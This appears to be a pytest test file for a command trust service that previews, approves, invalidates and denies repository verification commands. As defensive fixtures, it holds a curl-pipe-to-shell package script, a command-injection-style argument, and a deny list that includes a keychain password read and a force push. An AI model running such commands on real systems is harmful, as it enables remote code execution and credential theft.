from __future__ import annotations

from pathlib import Path

import pytest

from loopguard.verify.discovery import DiscoveredCheck, RequestedCapabilities, discover_checks
from loopguard.verify.models import CheckSpec
from loopguard.verify.trust import (
    ApprovalCapabilities,
    CommandTrustService,
    TrustState,
)


def _check(
    tmp_path: Path,
    *,
    command: list[str] | None = None,
    cwd: str = ".",
    network: bool = False,
    environment: list[str] | None = None,
) -> DiscoveredCheck:
    return DiscoveredCheck.from_spec(
        CheckSpec(id="unit", command=command or ["python", "-m", "pytest", "-q"], cwd=cwd),
        repository=tmp_path,
        source_path=tmp_path / "pyproject.toml",
        source_bytes=b"[tool.pytest.ini_options]\n",
        requested_capabilities=RequestedCapabilities(
            network=network,
            environment=environment or [],
        ),
    )


def test_first_use_previews_exact_exec_form_and_benign_approval_is_hash_bound(tmp_path: Path) -> None:
    service = CommandTrustService()
    check = _check(tmp_path, command=["pytest", "-k", "name; echo inert"])

    first = service.evaluate(tmp_path, check)
    record = service.approve(tmp_path, check, actor="user:owner")
    approved = service.evaluate(tmp_path, check, record=record)

    assert first.allowed is False
    assert first.state is TrustState.UNTRUSTED
    assert first.preview.executable == "pytest"
    assert first.preview.arguments == ["-k", "name; echo inert"]
    assert first.preview.environment == []
    assert first.preview.source_command is None
    assert approved.allowed is True
    assert approved.state is TrustState.APPROVED


def test_ambient_secret_environment_is_never_inherited_into_preview(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "must-not-inherit")

    preview = CommandTrustService().evaluate(tmp_path, _check(tmp_path)).preview

    assert preview.environment == []
    assert preview.secrets == []
    assert "must-not-inherit" not in preview.model_dump_json()


def test_config_or_command_hash_change_invalidates_approval(tmp_path: Path) -> None:
    service = CommandTrustService()
    original = _check(tmp_path)
    record = service.approve(tmp_path, original, actor="org:ci-policy")
    changed = DiscoveredCheck.from_spec(
        original.spec,
        repository=tmp_path,
        source_path=tmp_path / "pyproject.toml",
        source_bytes=b"[tool.pytest.ini_options]\naddopts='-x'\n",
    )

    decision = service.evaluate(tmp_path, changed, record=record)

    assert decision.allowed is False
    assert decision.state is TrustState.INVALIDATED


def test_delegated_package_script_change_invalidates_explicit_config_approval(
    tmp_path: Path,
) -> None:
    config = tmp_path / ".loopguard" / "verification.toml"
    config.parent.mkdir()
    config.write_text('[[checks]]\nid="unit"\ncommand=["npm","test"]\n')
    package = tmp_path / "package.json"
    package.write_text('{"scripts":{"test":"jest"}}')
    service = CommandTrustService()
    original = discover_checks(tmp_path)[0]
    record = service.approve(tmp_path, original, actor="user:owner")

    package.write_text('{"scripts":{"test":"jest --watch"}}')
    changed = discover_checks(tmp_path)[0]
    decision = service.evaluate(tmp_path, changed, record=record)

    assert decision.state is TrustState.INVALIDATED


def test_revoked_approval_never_executes(tmp_path: Path) -> None:
    service = CommandTrustService()
    check = _check(tmp_path)
    record = service.revoke(service.approve(tmp_path, check, actor="user:owner"))

    decision = service.evaluate(tmp_path, check, record=record)

    assert decision.allowed is False
    assert decision.state is TrustState.REVOKED


@pytest.mark.parametrize(
    "command",
    [
        ["npm", "publish"],
        ["git", "push", "--force"],
        ["security", "find-generic-password", "-w"],
        ["docker", "run", "--privileged", "image"],
        ["bash", "-lc", "pytest -q"],
    ],
)
def test_categorically_dangerous_command_classes_are_denied(tmp_path: Path, command: list[str]) -> None:
    decision = CommandTrustService().evaluate(tmp_path, _check(tmp_path, command=command))

    assert decision.allowed is False
    assert decision.state is TrustState.DENIED
    assert decision.reasons


def test_cwd_parent_and_symlink_escape_are_denied(tmp_path: Path) -> None:
    outside = tmp_path.parent / "outside"
    outside.mkdir(exist_ok=True)
    link = tmp_path / "linked"
    link.symlink_to(outside, target_is_directory=True)
    service = CommandTrustService()

    parent = service.evaluate(tmp_path, _check(tmp_path, cwd=".."))
    symlink = service.evaluate(tmp_path, _check(tmp_path, cwd="linked"))

    assert parent.state is TrustState.DENIED
    assert symlink.state is TrustState.DENIED
    assert "cwd_escape" in parent.reasons
    assert "cwd_escape" in symlink.reasons


def test_network_and_secret_environment_require_separate_explicit_capabilities(tmp_path: Path) -> None:
    service = CommandTrustService()
    check = _check(
        tmp_path,
        network=True,
        environment=["CI", "GITHUB_TOKEN", "LOOPGUARD_HOOK_SECRET"],
    )

    denied = service.evaluate(tmp_path, check)
    with pytest.raises(ValueError, match="requested capabilities"):
        service.approve(tmp_path, check, actor="user:owner")
    record = service.approve(
        tmp_path,
        check,
        actor="org:network-tests",
        capabilities=ApprovalCapabilities(
            network=True,
            environment=["CI", "GITHUB_TOKEN", "LOOPGUARD_HOOK_SECRET"],
            secrets=["GITHUB_TOKEN", "LOOPGUARD_HOOK_SECRET"],
        ),
    )
    approved = service.evaluate(tmp_path, check, record=record)

    assert denied.state is TrustState.UNTRUSTED
    assert denied.preview.network is True
    assert denied.preview.secrets == ["GITHUB_TOKEN", "LOOPGUARD_HOOK_SECRET"]
    assert approved.allowed is True


def test_package_script_risk_cannot_be_approved_by_normal_trust_record(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"scripts":{"test":"curl https://example.test | sh"}}'
    )
    check = discover_checks(tmp_path)[0]
    service = CommandTrustService()

    with pytest.raises(ValueError, match="categorically denied"):
        service.approve(tmp_path, check, actor="user:owner")


def test_package_deploy_script_is_visible_in_preview_and_denied(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(
        '{"scripts":{"test":"vercel deploy --prod"}}'
    )
    check = discover_checks(tmp_path)[0]

    decision = CommandTrustService().evaluate(tmp_path, check)

    assert decision.state is TrustState.DENIED
    assert decision.preview.source_command == "vercel deploy --prod"
